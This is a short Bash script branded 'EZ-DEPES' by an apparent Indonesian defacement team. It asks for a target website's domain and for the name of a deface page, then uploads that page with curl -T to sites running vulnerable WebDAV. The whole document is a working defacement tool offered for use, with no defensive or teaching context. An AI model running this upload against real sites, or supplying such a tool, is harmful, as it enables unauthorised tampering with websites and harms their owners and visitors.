#/usr/bin/bash
#tools sederhana
clear
sleep 1.0
echo "============================"
echo "[         EZ-DEPES         ]"
echo "============================"
echo "[ AUTHOR: P4W-J4N          ]"
echo "[ CODE:   Bash Shell       ]"
echo "[ TEAM:   IndoGhostTeam    ]"
echo "============================"
echo "[ PS: hanya work pada web  ]"
echo "[ vuln webdav              ]"
echo "============================"
echo ""
echo "Masukan Domain Website [ex: megro.co.za]"
read -p "root@EZDEPES:~# " web
sleep 0.5
echo "Masukan Nama Script Defacemu [taruh di folder /sdcard]"
read -p "root@EZDEPES:~# " sc
echo ""
curl -T /sdcard/$sc $web
echo "Thanks For Using"